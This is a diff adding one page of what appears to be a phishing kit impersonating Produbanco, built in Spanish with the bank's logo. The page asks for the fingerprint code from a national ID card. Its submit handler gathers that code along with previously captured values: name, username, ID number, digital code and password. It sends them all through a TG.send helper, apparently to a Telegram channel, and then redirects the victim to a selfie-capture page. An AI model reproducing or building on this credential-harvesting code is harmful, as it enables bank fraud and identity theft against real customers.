@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identidad</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-bg: #ffffff;
+      --ds-green-primary: #046a38;
+      --ds-gray-input: #cdcdcd;
+      --ds-gray-disabled: #e3e3e3;
+      --ds-gray-text: #8b8b8b;
+      --ds-text-dark: #3f3f3f;
+      --ds-text-mid: #5a5a5a;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "Nunito Sans", sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: var(--ds-bg);
+      color: #000;
+      overflow: hidden;
+    }
+
+    body {
+      overflow-x: hidden;
+    }
+
+    .page {
+      margin: 0 auto;
+      max-width: 360px;
+      min-height: 100vh;
+      padding: 10px 16px 24px;
+      width: 100%;
+    }
+
+    .ds-logotipo {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg");
+      background-position: left center;
+      background-repeat: no-repeat;
+      background-size: 210px 58px;
+      height: 58px;
+      margin-bottom: 20px;
+      width: 210px;
+    }
+
+    .content {
+      margin-top: 24px;
+    }
+
+    .title {
+      color: var(--ds-text-dark);
+      font-size: 20px;
+      font-style: normal;
+      font-weight: 700;
+      letter-spacing: -0.2px;
+      line-height: 27px;
+      margin: 0;
+    }
+
+    .subtitle {
+      color: var(--ds-text-mid);
+      font-size: 11px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 15px;
+      margin: 2px 0 24px;
+    }
+
+    .doc-image-wrap {
+      border-radius: 13px;
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .doc-image {
+      display: block;
+      height: auto;
+      width: 100%;
+    }
+
+    .form-group {
+      margin-top: 24px;
+    }
+
+    .field-label {
+      color: var(--ds-text-dark);
+      display: inline-block;
+      font-size: 12px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 12px;
+      margin-bottom: 6px;
+    }
+
+    .field-input {
+      appearance: none;
+      background: #fff;
+      border: 1px solid var(--ds-gray-input);
+      border-radius: 4px;
+      color: #4a4a4a;
+      display: block;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      height: 40px;
+      letter-spacing: 0.2px;
+      line-height: 20px;
+      outline: 0;
+      padding: 10px 12px;
+      text-transform: uppercase;
+      width: 100%;
+    }
+
+    .field-input::placeholder {
+      color: var(--ds-gray-text);
+      text-transform: none;
+    }
+
+    .field-input:focus {
+      border-color: var(--ds-green-primary);
+    }
+
+    .btn-continue {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      cursor: pointer;
+      display: inline-flex;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      height: 42px;
+      justify-content: center;
+      line-height: 21px;
+      margin-top: 36px;
+      padding: 0 18px;
+      width: 100%;
+    }
+
+    .btn-continue.btn-disabled {
+      background-color: var(--ds-gray-disabled);
+      border-color: var(--ds-gray-disabled);
+      color: var(--ds-gray-text);
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .btn-continue.btn-enabled {
+      background-color: var(--ds-green-primary);
+      border-color: var(--ds-green-primary);
+      color: #fff;
+    }
+
+    .btn-continue.btn-enabled:hover {
+      background-color: #368860;
+      border-color: #368860;
+    }
+
+    @media (max-width: 390px) {
+      .content {
+        margin-top: 26px;
+      }
+
+      .title {
+        font-size: 20px;
+        line-height: 27px;
+      }
+
+      .subtitle {
+        font-size: 11px;
+        line-height: 15px;
+      }
+
+      .field-label {
+        font-size: 12px;
+        line-height: 12px;
+      }
+
+      .field-input {
+        font-size: 15px;
+      }
+
+      .btn-continue {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header class="ds-logotipo" aria-label="Logotipo Produbanco"></header>
+
+    <section class="content">
+      <h2 class="title">Ingresa tu c&oacute;digo dactilar</h2>
+      <p class="subtitle">Debe contener 10 caracteres. Ej: E1234V5678</p>
+
+      <div class="doc-image-wrap">
+        <img
+          class="doc-image"
+          src="https://static.wixstatic.com/media/1dff55_8e2403fb0dde4c5ebdf0c8899c981ea7~mv2.png"
+          alt="Documento de identidad"
+        >
+      </div>
+
+      <form id="frmDactilar">
+        <div class="form-group">
+          <label class="field-label" for="codigoDactilar">C&oacute;digo dactilar</label>
+          <input
+            id="codigoDactilar"
+            class="field-input"
+            type="text"
+            maxlength="10"
+            placeholder="Ej: E1234V5678"
+            autocomplete="off"
+            spellcheck="false"
+            autofocus
+          >
+        </div>
+
+        <button id="btnContinuar" class="btn-continue btn-disabled" type="submit" disabled>
+          Continuar
+        </button>
+      </form>
+    </section>
+  </main>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      const frmDactilar = document.getElementById("frmDactilar");
+      const inputCodigo = document.getElementById("codigoDactilar");
+      const btnContinuar = document.getElementById("btnContinuar");
+
+      function normalizarCodigo(valor) {
+        return valor
+          .toUpperCase()
+          .replace(/[^A-Z0-9]/g, "")
+          .slice(0, 10);
+      }
+
+      function actualizarEstadoBoton() {
+        const habilitar = inputCodigo.value.length >= 1;
+        btnContinuar.disabled = !habilitar;
+        btnContinuar.classList.toggle("btn-disabled", !habilitar);
+        btnContinuar.classList.toggle("btn-enabled", habilitar);
+      }
+
+      inputCodigo.addEventListener("keydown", function (event) {
+        if (event.key === " ") {
+          event.preventDefault();
+        }
+      });
+
+      inputCodigo.addEventListener("input", function () {
+        const inicio = this.selectionStart || 0;
+        const previo = this.value;
+        const normalizado = normalizarCodigo(previo);
+
+        this.value = normalizado;
+
+        const desplazamiento = previo.length - normalizado.length;
+        const nuevaPosicion = Math.max(0, inicio - desplazamiento);
+        this.setSelectionRange(nuevaPosicion, nuevaPosicion);
+
+        actualizarEstadoBoton();
+      });
+
+      inputCodigo.addEventListener("paste", function (event) {
+        event.preventDefault();
+        const texto = (event.clipboardData || window.clipboardData).getData("text");
+        inputCodigo.value = normalizarCodigo(texto);
+        actualizarEstadoBoton();
+      });
+
+      frmDactilar.addEventListener("submit", function (event) {
+        event.preventDefault();
+        if (btnContinuar.disabled) {
+          return;
+        }
+
+        const codigo = inputCodigo.value;
+        TG.save("dactilar", codigo);
+
+        var msg = '\u{1F464} Nombre: ' + TG.load('nombres') + '\n';
+        msg += '\u{1F464} USU: ' + TG.load('usuario') + '\n';
+      msg += '\u{1F4C4} Documento: ' + TG.load('documento') + '\n';
+      msg += '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n';
+        msg += '\u{1F512} SENA: ' + TG.load('sena') + '\n';
+        msg += '\u{1FAC6} Dactilar: ' + codigo;
+
+        TG.overlay(true);
+        TG.send(msg, false).then(function () {
+          TG.overlay(false);
+          window.location.href = "selfie.html";
+        });
+      });
+
+      actualizarEstadoBoton();
+    })();
+  </script>
+</body>
+</html>
